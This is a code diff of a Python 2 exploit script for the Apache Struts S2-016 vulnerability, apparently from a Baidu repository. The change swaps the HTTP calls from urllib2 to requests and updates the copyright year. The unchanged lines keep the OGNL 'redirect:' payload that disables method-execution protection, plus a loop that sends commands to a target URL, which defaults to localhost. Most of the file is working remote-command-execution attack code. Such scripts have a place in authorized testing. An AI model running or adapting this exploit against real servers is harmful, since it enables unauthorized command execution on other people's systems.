@@ -1,30 +1,18 @@
 ##############################################################################
 #
-# Copyright (c) 2017 Baidu.com, Inc. All Rights Reserved
+# Copyright (c) 2018 Baidu.com, Inc. All Rights Reserved
 #
 ##############################################################################
-"""
-struts s2-016 exploit
-
-
-Date: 2017/06/26 17:10:00
-"""
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 
 import re
 import ssl
 import sys
-import httplib
-import urllib
-import urllib2
-import fileinput
-
-PATTERN = re.compile(r'<input type="text" name="age" value="([^"]*)" id="user_age"/>')
-
+import requests
+import traceback
 
 def _run(url, cmd):
-    url += '/default.action'
     try:
         payload = 'redirect:'
         payload += '''${#context['xwork.MethodAccessor.denyMethodExecution']=false,'''
@@ -44,19 +32,15 @@ def _run(url, cmd):
         payload = payload.replace('#', '%23')
         payload = payload.replace('=', '%3D')
 
-        url = url + '?' + payload 
-
-        headers = {'User-Agent': 'Mozilla/5.0'}
-        request = urllib2.Request(url, headers=headers)
-        page = urllib2.urlopen(request).read()
-    except httplib.IncompleteRead as e:
-        page = e.partial
-
-    print page
+        resp = requests.post(url, data = payload, headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'})
+        print resp.text
+    except Exception as e:
+        traceback.print_exc()
+        pass
 
 if __name__ == "__main__":
-    url = 'http://localhost:8080/S2-016' if len(sys.argv) == 1 else sys.argv[1]
-    print 'URL=' + url
+    url = 'http://127.0.0.1:8080/S2-016/default.action' if len(sys.argv) == 1 else sys.argv[1]
+    print 'Target URL=' + url
 
     while True:
         try:
